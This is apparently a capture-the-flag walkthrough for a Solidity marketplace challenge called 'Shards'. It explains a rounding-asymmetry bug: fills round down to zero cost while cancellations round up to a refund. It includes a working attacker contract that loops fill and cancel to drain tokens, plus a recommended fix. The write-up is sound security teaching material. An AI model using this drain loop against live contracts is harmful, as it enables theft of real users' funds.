## Challenge 16 Walkthrough: Shards

### Vulnerability

The marketplace prices a partial purchase ("fill") by rounding **down**, but refunds a cancellation by rounding **up** — and the two use different formulas, so a buy-then-cancel cycle can be profitable.

Buying `want` shards costs:

```solidity
// fill(offerId, want)
uint256 _want = want;
...
uint256 paymentToken = _want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards);
// _toDVT(price, rate) = price.mulDivDown(rate, 1e6)
```

Cancelling that same purchase refunds:

```solidity
// cancel(offerId, purchaseIndex)
uint256 _shards = purchase.shards;
...
uint256 payment = _shards.mulDivUp(purchase.rate, 1e6);   // ← different formula, rounds UP
```

With this challenge's parameters (`price = 1e12`, `rate = 75e15`, `totalShards = 1e25`), the per-shard fill cost is so small that buying up to **133 shards rounds down to 0 DVT**, while cancelling those 133 shards refunds:

```
mulDivUp(133, 75e15, 1e6) = 9,975,000,000,000 wei  (≈ 9.975e12 DVT)
```

So each `fill(1, 133)` → `cancel(1, idx)` cycle costs nothing and pays out ≈ 9.975e12 DVT. Two further details make this a single self-contained transaction:

- The cancel time guard does **not** revert in the same block the purchase was made.
- Never fully filling the offer keeps `isOpen == true`, so `cancel` stays callable.

### Exploit

```solidity
function test_shards() public checkSolvedByPlayer {
    new ShardsAttacker(address(marketplace), address(token), recovery);
}
```

The attacker's constructor is the single player transaction. It loops the free-extraction cycle, then forwards everything to recovery:

```solidity
uint256 constant WANT = 133;     // largest amount whose fill cost rounds to 0
uint256 constant CYCLES = 7519;  // enough refunds to clear the win threshold

constructor(address marketplace, address token, address recovery) {
    IShardsMarket m = IShardsMarket(marketplace);
    for (uint256 i = 0; i < CYCLES; i++) {
        uint256 idx = m.fill(1, WANT);  // buy 133 shards → cost rounds DOWN to 0
        m.cancel(1, idx);               // same-block cancel → refund rounds UP to 9.975e12
    }
    IERC20Like t = IERC20Like(token);
    t.transfer(recovery, t.balanceOf(address(this)));
}
```

The win threshold is `initialTokensInMarketplace * 1e16 / 100e18 = 7.5e16`. Each cycle nets 9.975e12, so 7519 cycles extract:

```
7519 × 9.975e12 = 7.5002025e16 DVT  >  7.5e16  ✓
```

The staking pool is never touched (the extraction only moves the marketplace's fee balance), satisfying that invariant.

```
constructor
    └─> loop ×7519:
            fill(1, 133)     → cost = mulDivDown(133, 75e21, 1e25) = 0 DVT
            cancel(1, idx)   → refund = mulDivUp(133, 75e15, 1e6) = 9.975e12 DVT
    └─> token.transfer(recovery, 7.5002e16)   (player keeps nothing)
```

### Why It Works

`fill` and `cancel` are not inverses. The buy path rounds the price down (to zero for small amounts), the cancel path rounds the refund up using a different expression entirely, so the protocol pays out more than it ever charged. Because the cost is zero, the attack needs no starting capital, and same-block cancellation sidesteps the timing guard — the loop simply mints free DVT from the rounding gap until the threshold is cleared.

The fix is to make the two paths consistent: charge and refund with the same formula and rounding direction (round the user's refund **down**, never up), and reject fills whose computed cost rounds to zero.

This is a **fill/cancel rounding-asymmetry drain** — buying 133 shards costs nothing while cancelling refunds 9.975e12 DVT, repeated until ≈7.5e16 DVT is extracted to recovery.
